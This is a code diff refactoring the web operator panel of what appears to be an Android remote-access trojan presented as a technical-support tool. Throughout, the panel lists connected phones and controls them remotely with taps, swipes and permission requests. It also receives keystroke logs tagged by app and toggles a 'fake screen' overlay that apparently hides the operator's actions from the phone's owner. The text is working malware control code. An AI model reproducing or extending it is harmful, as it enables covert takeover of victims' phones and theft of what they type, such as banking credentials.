@@ -22,30 +22,22 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .ctrl.danger:hover{background:#2d1515;color:#fc8181}
 .ctrl.danger:hover i{color:#fc8181}
 .ctrl.warn{color:#ed8936}.ctrl.warn i{color:#ed8936}
-.ctrl.warn:hover{background:#2d1f0a;color:#fbd38d}
+.ctrl.warn:hover{background:#2d1f0a}
 .ctrl.purple{color:#9f7aea}.ctrl.purple i{color:#9f7aea}
-.ctrl.purple:hover{background:#1a1535;color:#d6bcfa}
-.ctrl.active-stream{color:#68d391}.ctrl.active-stream i{color:#68d391}
+.ctrl.purple:hover{background:#1a1535}
 .center{display:flex;flex-direction:column;align-items:center;padding:12px 20px;gap:8px;overflow:auto}
-.device{background:#111827;border:3px solid #374151;border-radius:32px;position:relative;flex-shrink:0;box-shadow:0 0 0 1px #1f2937,0 20px 60px rgba(0,0,0,0.5);overflow:hidden}
+.device{background:#111827;border:3px solid #374151;border-radius:32px;position:relative;flex-shrink:0;box-shadow:0 0 0 1px #1f2937,0 20px 60px rgba(0,0,0,.5);overflow:hidden}
 .screen{width:100%;height:100%;background:#0d1117;cursor:crosshair;position:relative;overflow:hidden}
-#stream-img{position:absolute;top:0;left:0;width:100%;height:100%;display:none;pointer-events:none}
-#wireframe-canvas{position:absolute;top:0;left:0;width:100%;height:100%;display:block;pointer-events:none}
-.screen-placeholder{text-align:center;color:#2d3748;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
-.screen-placeholder i{font-size:36px;display:block;margin-bottom:8px}
-.screen-placeholder p{font-size:11px}
-.mode-badge{position:absolute;top:8px;left:50%;transform:translateX(-50%);font-size:9px;padding:2px 8px;border-radius:999px;z-index:10;white-space:nowrap}
-.mode-badge.wireframe{background:#2d3748;color:#9f7aea;display:block}
-.mode-badge.stream{background:#1a3a2a;color:#68d391;display:block}
+#wireframe-canvas{position:absolute;top:0;left:0;width:100%;height:100%}
+.placeholder{text-align:center;color:#2d3748;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+.placeholder i{font-size:36px;display:block;margin-bottom:8px}
+.placeholder p{font-size:11px}
 .nav-bar{display:flex;gap:6px;justify-content:center;flex-wrap:wrap}
 .nav-btn{padding:8px 14px;background:#1e2433;border:1px solid #2d3748;border-radius:10px;color:#a0aec0;cursor:pointer;font-size:11px;display:flex;align-items:center;gap:4px;flex-direction:column}
 .nav-btn:hover{background:#2d3748;color:#fff}
-.nav-btn.warn{border-color:#ed8936;color:#ed8936}
-.nav-btn.warn:hover{background:#2d1f0a;color:#fbd38d}
 .nav-btn.purple{border-color:#9f7aea;color:#9f7aea}
-.nav-btn.purple:hover{background:#1a1535;color:#d6bcfa}
+.nav-btn.purple:hover{background:#1a1535}
 .nav-btn.active-overlay{border-color:#fc8181;color:#fc8181;animation:pulse 1.5s infinite}
-.nav-btn.active-stream{border-color:#68d391;color:#68d391}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
 .nav-btn i{font-size:16px}
 .nav-btn span{font-size:9px}
@@ -53,7 +45,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .msg-box input{flex:1;background:#1e2433;border:1px solid #2d3748;border-radius:8px;padding:8px 12px;color:#e2e8f0;font-size:13px;outline:none}
 .msg-box input:focus{border-color:#4299e1}
 .msg-box input::placeholder{color:#4a5568}
-.msg-box button{padding:8px 14px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px;white-space:nowrap;display:flex;align-items:center;gap:4px}
+.msg-box button{padding:8px 14px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px;display:flex;align-items:center;gap:4px}
 .msg-box button:hover{background:#3182ce}
 .right{border-left:1px solid #2d3748;background:#161b27;padding:12px;display:flex;flex-direction:column;overflow:hidden}
 .stat-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid #1e2433;font-size:11px}
@@ -74,12 +66,12 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .cliente-card{background:#1e2433;border:1px solid #2d3748;border-radius:12px;padding:12px 16px;width:320px;display:flex;align-items:center;justify-content:space-between;gap:12px}
 .cliente-info{font-size:12px;color:#a0aec0;line-height:1.6}
 .cliente-info strong{color:#e2e8f0;font-size:13px}
-.btn-atender{padding:7px 14px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px;white-space:nowrap}
+.btn-atender{padding:7px 14px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px}
 .btn-atender:hover{background:#3182ce}
 .sem-clientes{color:#4a5568;font-size:13px;text-align:center}
 .sem-clientes i{font-size:32px;display:block;margin-bottom:8px}
 #tela-painel{display:none;flex:1;overflow:hidden}
-.tela-painel-inner{display:grid;grid-template-columns:200px 1fr 240px;height:100%}
+.painel-inner{display:grid;grid-template-columns:200px 1fr 240px;height:100%}
 </style>
 </head>
 <body>
@@ -95,6 +87,8 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 </div>
 
 <div style="display:flex;flex:1;overflow:hidden">
+
+  <!-- TELA: lista de clientes -->
   <div id="tela-clientes">
     <h2><i class="ti ti-devices" style="margin-right:6px"></i>Clientes aguardando atendimento</h2>
     <div id="lista-clientes">
@@ -102,8 +96,11 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
     </div>
   </div>
 
+  <!-- TELA: painel do técnico -->
   <div id="tela-painel">
-    <div class="tela-painel-inner">
+    <div class="painel-inner">
+
+      <!-- Sidebar -->
       <div class="sidebar">
         <p class="sec-title">Sistema</p>
         <button class="ctrl" onclick="sendCmd('home')"><i class="ti ti-home"></i> Home</button>
@@ -121,24 +118,22 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
         <p class="sec-title">Volume</p>
         <div class="vol-row"><i class="ti ti-volume"></i><input type="range" min="0" max="15" value="5" oninput="send({tipo:'volume',valor:+this.value})"></div>
         <div class="vol-row"><i class="ti ti-brightness"></i><input type="range" min="0" max="255" value="120" oninput="send({tipo:'brilho',valor:+this.value})"></div>
-        <p class="sec-title">Visualização</p>
-        <button class="ctrl warn" id="btn-stream-sidebar" onclick="toggleStream()"><i class="ti ti-screen-share"></i> Pedir tela (stream)</button>
-        <button class="ctrl" onclick="send({tipo:'cmd',cmd:'solicitar_tela'});log('→ Atualizando wireframe','ev')"><i class="ti ti-refresh"></i> Atualizar wireframe</button>
+        <p class="sec-title">Controle</p>
+        <button class="ctrl warn" onclick="pedirWireframe()"><i class="ti ti-refresh"></i> Atualizar tela</button>
         <button class="ctrl" onclick="send({tipo:'cmd',cmd:'pedir_permissoes'})"><i class="ti ti-shield-check"></i> Pedir permissões</button>
         <button class="ctrl purple" id="btn-overlay-sidebar" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i> Tela falsa</button>
         <p class="sec-title">Sessão</p>
         <button class="ctrl danger" onclick="encerrar()"><i class="ti ti-plug-x"></i> Encerrar sessão</button>
       </div>
 
+      <!-- Centro: visor do dispositivo -->
       <div class="center">
         <div class="device" id="device-wrap">
           <div class="screen" id="screen" onclick="handleToque(event)">
-            <img id="stream-img" alt="">
             <canvas id="wireframe-canvas"></canvas>
-            <div class="mode-badge wireframe" id="mode-badge">🔷 Wireframe</div>
-            <div class="screen-placeholder" id="placeholder">
+            <div class="placeholder" id="placeholder">
               <i class="ti ti-device-mobile"></i>
-              <p>Aguardando dados...</p>
+              <p>Aguardando wireframe...</p>
             </div>
           </div>
         </div>
@@ -149,7 +144,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
           <button class="nav-btn" onclick="sendCmd('recents')"><i class="ti ti-square"></i><span>Recentes</span></button>
           <button class="nav-btn" onclick="send({tipo:'swipe',dir:'up'})"><i class="ti ti-arrow-up"></i><span>Swipe ↑</span></button>
           <button class="nav-btn" onclick="send({tipo:'swipe',dir:'down'})"><i class="ti ti-arrow-down"></i><span>Swipe ↓</span></button>
-          <button class="nav-btn warn" id="btn-stream-nav" onclick="toggleStream()"><i class="ti ti-screen-share" id="stream-icon"></i><span id="stream-label">Pedir tela</span></button>
+          <button class="nav-btn" onclick="pedirWireframe()"><i class="ti ti-refresh"></i><span>Atualizar</span></button>
           <button class="nav-btn purple" id="btn-overlay-nav" onclick="toggleOverlay()"><i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span></button>
         </div>
 
@@ -159,6 +154,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
         </div>
       </div>
 
+      <!-- Direita: status + log -->
       <div class="right">
         <p class="sec-title">Status do dispositivo</p>
         <div class="stat-row"><span class="stat-label">Bateria</span><span class="stat-val" id="d-bat">—</span></div>
@@ -174,322 +170,246 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
         <div class="log" id="painel-log"></div>
         <div class="log" id="painel-key" style="display:none"></div>
       </div>
+
     </div>
   </div>
 </div>
 
 <script>
 const SERVER = window.location.origin.replace(/^http/, 'ws');
-let ws = null, deviceAtual = null, streaming = false;
-let dispositivoLargura = 0, dispositivoAltura = 0;
-let abaAtual = 'log';
-let overlayAtivo = false;
+let ws = null, deviceAtual = null;
+let dw = 1080, dh = 2340;
+let abaAtual = 'log', overlayAtivo = false;
 const VISOR_W = 260;
 
-function mudarAba(aba){
-  abaAtual=aba;
-  document.getElementById('painel-log').style.display=aba==='log'?'block':'none';
-  document.getElementById('painel-key').style.display=aba==='key'?'block':'none';
-  document.getElementById('tab-log').className='tab'+(aba==='log'?' active':'');
-  document.getElementById('tab-key').className='tab'+(aba==='key'?' active':'');
-  if(aba==='key') document.getElementById('key-badge').style.display='none';
-}
+// ── WebSocket ──────────────────────────────────────────────────────────────
 
-function log(msg,tipo=''){
-  const el=document.getElementById('painel-log');
-  const d=document.createElement('div');
-  d.className='log-entry '+tipo;
-  d.innerHTML=`<span class="ts">${new Date().toLocaleTimeString('pt-BR')}</span>${msg}`;
-  el.prepend(d);
-}
-
-function logKey(texto,app){
-  const el=document.getElementById('painel-key');
-  const d=document.createElement('div');
-  d.className='keylog-entry';
-  d.innerHTML=`<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
-  el.prepend(d);
-  if(abaAtual!=='key') document.getElementById('key-badge').style.display='inline';
-}
-
-conectarTecnico();
-
-function conectarTecnico(){
-  ws=new WebSocket(`${SERVER}?papel=tecnico`);
-  ws.onopen=()=>{
-    setStatus(true); log('Painel conectado','ev');
-    if(deviceAtual){
-      setTimeout(()=>{
-        if(ws.readyState===WebSocket.OPEN){
-          ws.send(JSON.stringify({tipo:'conectar_cliente',deviceToken:deviceAtual}));
-        }
-      },1000);
+function conectar() {
+  ws = new WebSocket(`${SERVER}?papel=tecnico`);
+  ws.onopen = () => {
+    setStatus(true);
+    log('Painel conectado', 'ev');
+    if (deviceAtual) {
+      setTimeout(() => send({tipo:'conectar_cliente', deviceToken: deviceAtual}), 1000);
     }
   };
-  ws.onmessage=(e)=>{
-    const msg=JSON.parse(e.data);
-    switch(msg.tipo){
-      case 'lista_clientes': renderizarClientes(msg.clientes); break;
-      case 'sessao_iniciada':
-        deviceAtual=msg.deviceToken;
-        atualizarDispositivo(msg.info);
-        abrirPainel();
-        log('Sessão iniciada','ev');
-        // Pede wireframe imediatamente
-        setTimeout(()=>{
-          send({tipo:'cmd',cmd:'solicitar_tela'});
-          log('→ Solicitando wireframe...','ev');
-        }, 500);
-        break;
-      case 'stream_iniciado': iniciarStreamUI(); log('Stream ativo','ev'); break;
-      case 'frame_tela':
-        if(streaming) mostrarFrame(msg.frame);
-        break;
-      case 'arvore_tela':
-        desenharWireframe(JSON.parse(msg.elementos), msg.pacote);
-        break;
-      case 'keylog': logKey(msg.texto,msg.app||'desconhecido'); break;
-      case 'cliente_desconectou': log('Cliente desconectou','err'); break;
+  ws.onmessage = (e) => {
+    const msg = JSON.parse(e.data);
+    switch (msg.tipo) {
+      case 'lista_clientes':   renderClientes(msg.clientes); break;
+      case 'sessao_iniciada':  onSessaoIniciada(msg); break;
+      case 'arvore_tela':      desenharWireframe(JSON.parse(msg.elementos), msg.pacote); break;
+      case 'keylog':           logKey(msg.texto, msg.app || '?'); break;
+      case 'cliente_desconectou': log('Cliente desconectou', 'err'); break;
     }
   };
-  ws.onclose=()=>{setStatus(false);setTimeout(conectarTecnico,3000);};
+  ws.onclose = () => { setStatus(false); setTimeout(conectar, 3000); };
 }
+
+conectar();
+
+function send(msg) {
+  if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg));
+}
+function sendCmd(cmd) { send({tipo:'cmd', cmd}); log(`→ ${cmd}`); }
+function pedirWireframe() { send({tipo:'cmd', cmd:'solicitar_tela'}); log('→ Atualizando wireframe...', 'ev'); }
+
+// ── Sessão ─────────────────────────────────────────────────────────────────
+
+function onSessaoIniciada(msg) {
+  deviceAtual = msg.deviceToken;
+  atualizarInfo(msg.info);
+  document.getElementById('tela-clientes').style.display = 'none';
+  document.getElementById('tela-painel').style.display = 'flex';
+  document.getElementById('btn-voltar').style.display = 'block';
+  document.getElementById('session-id-top').textContent = `Token: ${deviceAtual}`;
+  log('Sessão iniciada', 'ev');
+  // Pede wireframe automaticamente ao conectar
+  setTimeout(pedirWireframe, 600);
+}
+
+function voltarLista() {
+  if (overlayAtivo) toggleOverlay();
+  deviceAtual = null;
+  document.getElementById('tela-painel').style.display = 'none';
+  document.getElementById('tela-clientes').style.display = 'flex';
+  document.getElementById('btn-voltar').style.display = 'none';
+  document.getElementById('session-id-top').textContent = '';
+  document.getElementById('placeholder').style.display = 'flex';
+  const ctx = document.getElementById('wireframe-canvas').getContext('2d');
+  ctx.clearRect(0, 0, 9999, 9999);
+}
+
+function encerrar() { send({tipo:'encerrar'}); voltarLista(); log('Sessão encerrada', 'err'); }
 
 // ── Wireframe ──────────────────────────────────────────────────────────────
 
-function desenharWireframe(elementos, pacote){
-  // Esconde stream se ativo, mostra canvas
-  document.getElementById('stream-img').style.display='none';
-  const canvas = document.getElementById('wireframe-canvas');
-  const screen = document.getElementById('screen');
-  document.getElementById('placeholder').style.display='none';
+function desenharWireframe(elementos, pacote) {
+  const canvas  = document.getElementById('wireframe-canvas');
+  const screen  = document.getElementById('screen');
+  const sw = screen.offsetWidth  || VISOR_W;
+  const sh = screen.offsetHeight || Math.round(VISOR_W * dh / dw);
 
-  const sw = screen.offsetWidth || VISOR_W;
-  const sh = screen.offsetHeight || Math.round(VISOR_W * (dispositivoAltura||2340) / (dispositivoLargura||1080));
-  canvas.width = sw;
+  canvas.width  = sw;
   canvas.height = sh;
 
   const ctx = canvas.getContext('2d');
   ctx.clearRect(0, 0, sw, sh);
-
-  // Fundo escuro
   ctx.fillStyle = '#0d1117';
   ctx.fillRect(0, 0, sw, sh);
 
-  // Nome do app
-  if(pacote){
+  if (pacote) {
     ctx.fillStyle = '#4a5568';
     ctx.font = '9px system-ui';
     ctx.fillText(pacote, 4, 12);
   }
 
-  const dw = dispositivoLargura || 1080;
-  const dh = dispositivoAltura || 2340;
-  const scaleX = sw / dw;
-  const scaleY = sh / dh;
+  const sx = sw / dw;
+  const sy = sh / dh;
 
   elementos.forEach(el => {
-    const x = el.x * scaleX;
-    const y = el.y * scaleY;
-    const w = el.w * scaleX;
-    const h = el.h * scaleY;
+    const x = el.x * sx, y = el.y * sy;
+    const w = el.w * sx, h = el.h * sy;
 
-    if(el.editavel){
-      ctx.strokeStyle = '#4299e1';
-      ctx.fillStyle = 'rgba(66,153,225,0.08)';
-    } else if(el.clicavel){
-      ctx.strokeStyle = '#68d391';
-      ctx.fillStyle = 'rgba(104,211,145,0.06)';
-    } else if(el.rolavel){
-      ctx.strokeStyle = '#ed8936';
-      ctx.fillStyle = 'rgba(237,137,54,0.05)';
-    } else {
-      ctx.strokeStyle = '#2d3748';
-      ctx.fillStyle = 'transparent';
-    }
+    if (el.editavel)      { ctx.strokeStyle='#4299e1'; ctx.fillStyle='rgba(66,153,225,.1)'; }
+    else if (el.clicavel) { ctx.strokeStyle='#68d391'; ctx.fillStyle='rgba(104,211,145,.07)'; }
+    else if (el.rolavel)  { ctx.strokeStyle='#ed8936'; ctx.fillStyle='rgba(237,137,54,.05)'; }
+    else                  { ctx.strokeStyle='#2d3748'; ctx.fillStyle='transparent'; }
 
-    ctx.lineWidth = el.clicavel || el.editavel ? 1.5 : 0.5;
+    ctx.lineWidth = (el.clicavel || el.editavel) ? 1.5 : 0.5;
     ctx.fillRect(x, y, w, h);
     ctx.strokeRect(x, y, w, h);
 
     const label = el.txt || el.desc || el.cls;
-    if(label){
-      ctx.fillStyle = el.clicavel ? '#68d391' : el.editavel ? '#4299e1' : '#718096';
+    if (label && h > 8) {
+      ctx.fillStyle = el.clicavel ? '#68d391' : el.editavel ? '#4299e1' : '#4a5568';
       ctx.font = `${Math.min(11, Math.max(7, h * 0.35))}px system-ui`;
       ctx.save();
-      ctx.beginPath();
-      ctx.rect(x+2, y, w-4, h);
-      ctx.clip();
+      ctx.beginPath(); ctx.rect(x+2, y, w-4, h); ctx.clip();
       ctx.fillText(label.substring(0, 30), x+3, y + h/2 + 4);
       ctx.restore();
     }
   });
 
-  // Se stream estava ativo, volta a mostrar stream por cima
-  if(streaming){
-    document.getElementById('stream-img').style.display='block';
-  }
+  document.getElementById('placeholder').style.display = 'none';
+  log(`Wireframe: ${elementos.length} elementos`, 'ev');
 }
 
-// ── Stream ─────────────────────────────────────────────────────────────────
+// ── Toque ──────────────────────────────────────────────────────────────────
 
-function toggleStream(){
-  streaming = !streaming;
-  send({tipo: streaming ? 'stream_start' : 'stream_stop'});
+function handleToque(e) {
+  const r = document.getElementById('screen').getBoundingClientRect();
+  const xPct = Math.max(0, Math.min(100, (e.clientX - r.left)  / r.width  * 100));
+  const yPct = Math.max(0, Math.min(100, (e.clientY - r.top)   / r.height * 100));
+  send({tipo:'toque', x:+xPct.toFixed(4), y:+yPct.toFixed(4), largura:dw, altura:dh});
+  log(`→ toque ${xPct.toFixed(1)}% ${yPct.toFixed(1)}%`);
+}
 
-  const btnNav  = document.getElementById('btn-stream-nav');
-  const btnSide = document.getElementById('btn-stream-sidebar');
-  const badge   = document.getElementById('mode-badge');
+// ── Overlay ────────────────────────────────────────────────────────────────
 
-  if(streaming){
-    send({tipo:'cmd', cmd:'solicitar_tela'}); // pede wireframe atualizado no fundo
-    btnNav.className  = 'nav-btn active-stream';
-    btnNav.innerHTML  = '<i class="ti ti-screen-share-off"></i><span>Parar tela</span>';
-    btnSide.className = 'ctrl active-stream';
-    btnSide.innerHTML = '<i class="ti ti-screen-share-off" style="font-size:15px"></i> Parar stream';
-    badge.textContent = '📡 Stream ao vivo';
-    badge.className   = 'mode-badge stream';
-    log('→ Stream ativado','ev');
+function toggleOverlay() {
+  overlayAtivo = !overlayAtivo;
+  send({tipo:'cmd', cmd: overlayAtivo ? 'overlay_on' : 'overlay_off'});
+  const btnN = document.getElementById('btn-overlay-nav');
+  const btnS = document.getElementById('btn-overlay-sidebar');
+  if (overlayAtivo) {
+    btnN.className = 'nav-btn active-overlay';
+    btnN.innerHTML = '<i class="ti ti-device-mobile-pause"></i><span>Remover</span>';
+    btnS.innerHTML = '<i class="ti ti-device-mobile-pause" style="font-size:15px;color:#fc8181"></i> Remover tela falsa';
+    log('→ Tela falsa ON', 'warn');
   } else {
-    document.getElementById('stream-img').style.display='none';
-    btnNav.className  = 'nav-btn warn';
-    btnNav.innerHTML  = '<i class="ti ti-screen-share"></i><span>Pedir tela</span>';
-    btnSide.className = 'ctrl warn';
-    btnSide.innerHTML = '<i class="ti ti-screen-share" style="font-size:15px;color:#ed8936"></i> Pedir tela (stream)';
-    badge.textContent = '🔷 Wireframe';
-    badge.className   = 'mode-badge wireframe';
-    log('→ Stream parado, voltando ao wireframe','warn');
+    btnN.className = 'nav-btn purple';
+    btnN.innerHTML = '<i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span>';
+    btnS.innerHTML = '<i class="ti ti-device-mobile-pause" style="font-size:15px;color:#9f7aea"></i> Tela falsa';
+    log('→ Tela falsa OFF', 'ev');
   }
 }
 
-function renderizarClientes(clientes){
-  const el=document.getElementById('lista-clientes');
-  if(!clientes||clientes.length===0){
-    el.innerHTML='<div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum cliente conectado</div>';
+// ── Mensagem ───────────────────────────────────────────────────────────────
+
+function enviarMensagem() {
+  const v = document.getElementById('msg-input').value.trim();
+  if (!v) return;
+  send({tipo:'mensagem', texto:v});
+  log(`→ msg: ${v}`, 'ev');
+  document.getElementById('msg-input').value = '';
+}
+
+// ── Info dispositivo ───────────────────────────────────────────────────────
+
+function atualizarInfo(info) {
+  if (!info) return;
+  document.getElementById('d-bat').textContent   = info.bateria || '—';
+  document.getElementById('d-ram').textContent   = info.ram     || '—';
+  document.getElementById('d-wifi').textContent  = info.wifi    || '—';
+  document.getElementById('d-os').textContent    = info.android || '—';
+  document.getElementById('d-model').textContent = info.modelo  || '—';
+  if (info.largura && info.altura) {
+    dw = parseInt(info.largura);
+    dh = parseInt(info.altura);
+    document.getElementById('d-res').textContent = `${dw}×${dh}`;
+    const h = Math.round(VISOR_W * dh / dw);
+    const wrap = document.getElementById('device-wrap');
+    const screen = document.getElementById('screen');
+    wrap.style.width  = screen.style.width  = VISOR_W + 'px';
+    wrap.style.height = screen.style.height = h + 'px';
+  }
+}
+
+// ── Clientes ───────────────────────────────────────────────────────────────
+
+function renderClientes(clientes) {
+  const el = document.getElementById('lista-clientes');
+  if (!clientes || clientes.length === 0) {
+    el.innerHTML = '<div class="sem-clientes"><i class="ti ti-device-mobile-off"></i>Nenhum cliente conectado</div>';
     return;
   }
-  el.innerHTML=clientes.map(c=>`
+  el.innerHTML = clientes.map(c => `
     <div class="cliente-card">
       <div class="cliente-info">
-        <strong>${c.info?.modelo||'Dispositivo desconhecido'}</strong><br>
+        <strong>${c.info?.modelo || 'Dispositivo desconhecido'}</strong><br>
         ${c.info?.android||''} &nbsp;|&nbsp; Bateria: ${c.info?.bateria||'—'} &nbsp;|&nbsp; ${c.info?.wifi||'—'}
-        ${c.emAtendimento?' &nbsp;<span style="color:#68d391">● Em atendimento</span>':''}
+        ${c.emAtendimento ? ' &nbsp;<span style="color:#68d391">● Em atendimento</span>' : ''}
       </div>
-      <button class="btn-atender" onclick="atenderCliente('${c.deviceToken}')">
+      <button class="btn-atender" onclick="send({tipo:'conectar_cliente',deviceToken:'${c.deviceToken}'})">
         <i class="ti ti-headset"></i> Atender
       </button>
     </div>
   `).join('');
 }
 
-function atenderCliente(token){ws.send(JSON.stringify({tipo:'conectar_cliente',deviceToken:token}));}
+// ── Log ────────────────────────────────────────────────────────────────────
 
-function abrirPainel(){
-  document.getElementById('tela-clientes').style.display='none';
-  document.getElementById('tela-painel').style.display='flex';
-  document.getElementById('btn-voltar').style.display='block';
-  document.getElementById('session-id-top').textContent=`Token: ${deviceAtual}`;
+function mudarAba(aba) {
+  abaAtual = aba;
+  document.getElementById('painel-log').style.display = aba==='log' ? 'block' : 'none';
+  document.getElementById('painel-key').style.display = aba==='key' ? 'block' : 'none';
+  document.getElementById('tab-log').className = 'tab' + (aba==='log' ? ' active' : '');
+  document.getElementById('tab-key').className = 'tab' + (aba==='key' ? ' active' : '');
+  if (aba==='key') document.getElementById('key-badge').style.display = 'none';
 }
 
-function iniciarStreamUI(){
-  streaming=true;
-  document.getElementById('stream-img').style.display='block';
+function log(msg, tipo='') {
+  const el = document.getElementById('painel-log');
+  const d  = document.createElement('div');
+  d.className = 'log-entry ' + tipo;
+  d.innerHTML = `<span class="ts">${new Date().toLocaleTimeString('pt-BR')}</span>${msg}`;
+  el.prepend(d);
 }
 
-function voltarLista(){
-  if(overlayAtivo) toggleOverlay();
-  if(streaming) toggleStream();
-  deviceAtual=null; streaming=false;
-  document.getElementById('tela-painel').style.display='none';
-  document.getElementById('tela-clientes').style.display='flex';
-  document.getElementById('btn-voltar').style.display='none';
-  document.getElementById('stream-img').style.display='none';
-  document.getElementById('placeholder').style.display='flex';
-  // Limpa canvas
-  const canvas=document.getElementById('wireframe-canvas');
-  const ctx=canvas.getContext('2d');
-  ctx.clearRect(0,0,canvas.width,canvas.height);
+function logKey(texto, app) {
+  const el = document.getElementById('painel-key');
+  const d  = document.createElement('div');
+  d.className = 'keylog-entry';
+  d.innerHTML = `<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
+  el.prepend(d);
+  if (abaAtual !== 'key') document.getElementById('key-badge').style.display = 'inline';
 }
 
-function send(msg){
-  if(!ws||ws.readyState!==WebSocket.OPEN) return;
-  ws.send(JSON.stringify(msg));
-}
-
-function sendCmd(cmd){send({tipo:'cmd',cmd});log(`→ cmd ${cmd}`);}
-
-function toggleOverlay(){
-  overlayAtivo = !overlayAtivo;
-  send({tipo:'cmd', cmd: overlayAtivo ? 'overlay_on' : 'overlay_off'});
-
-  const btnNav  = document.getElementById('btn-overlay-nav');
-  const btnSide = document.getElementById('btn-overlay-sidebar');
-
-  if(overlayAtivo){
-    btnNav.className = 'nav-btn active-overlay';
-    btnNav.innerHTML = '<i class="ti ti-device-mobile-pause"></i><span>Remover tela</span>';
-    btnSide.innerHTML= '<i class="ti ti-device-mobile-pause" style="font-size:15px;color:#fc8181"></i> Remover tela falsa';
-    log('→ Tela falsa ATIVADA','warn');
-  } else {
-    btnNav.className = 'nav-btn purple';
-    btnNav.innerHTML = '<i class="ti ti-device-mobile-pause"></i><span>Tela falsa</span>';
-    btnSide.innerHTML= '<i class="ti ti-device-mobile-pause" style="font-size:15px;color:#9f7aea"></i> Tela falsa';
-    log('→ Tela falsa REMOVIDA','ev');
-  }
-}
-
-function handleToque(e){
-  const screen=document.getElementById('screen');
-  const rect=screen.getBoundingClientRect();
-  const xPct=Math.max(0,Math.min(100,(e.clientX-rect.left)/rect.width*100));
-  const yPct=Math.max(0,Math.min(100,(e.clientY-rect.top)/rect.height*100));
-  send({tipo:'toque',x:+xPct.toFixed(4),y:+yPct.toFixed(4),largura:dispositivoLargura||1080,altura:dispositivoAltura||2340});
-}
-
-function enviarMensagem(){
-  const v=document.getElementById('msg-input').value.trim();
-  if(!v) return;
-  send({tipo:'mensagem',texto:v});
-  log(`→ mensagem: ${v}`,'ev');
-  document.getElementById('msg-input').value='';
-}
-
-function mostrarFrame(base64){
-  const img=document.getElementById('stream-img');
-  img.src='data:image/jpeg;base64,'+base64;
-  img.style.display='block';
-  document.getElementById('placeholder').style.display='none';
-}
-
-function atualizarDispositivo(info){
-  if(!info) return;
-  document.getElementById('d-bat').textContent=info.bateria||'—';
-  document.getElementById('d-ram').textContent=info.ram||'—';
-  document.getElementById('d-wifi').textContent=info.wifi||'—';
-  document.getElementById('d-os').textContent=info.android||'—';
-  document.getElementById('d-model').textContent=info.modelo||'—';
-  if(info.largura&&info.altura){
-    dispositivoLargura=parseInt(info.largura);
-    dispositivoAltura=parseInt(info.altura);
-    document.getElementById('d-res').textContent=`${dispositivoLargura}×${dispositivoAltura}`;
-    const ratio=dispositivoAltura/dispositivoLargura;
-    const w=VISOR_W;
-    const h=Math.round(w*ratio);
-    const wrap=document.getElementById('device-wrap');
-    const screen=document.getElementById('screen');
-    wrap.style.width=w+'px';
-    wrap.style.height=h+'px';
-    screen.style.width=w+'px';
-    screen.style.height=h+'px';
-  }
-}
-
-function encerrar(){send({tipo:'encerrar'});voltarLista();log('Sessão encerrada','err');}
-
-function setStatus(online){
-  const b=document.getElementById('status-badge');
-  b.className='status '+(online?'online':'offline');
-  b.innerHTML=`<span class="dot"></span> ${online?'Conectado':'Desconectado'}`;
+function setStatus(online) {
+  const b = document.getElementById('status-badge');
+  b.className = 'status ' + (online ? 'online' : 'offline');
+  b.innerHTML = `<span class="dot"></span> ${online ? 'Conectado' : 'Desconectado'}`;
 }
 </script>
 </body>
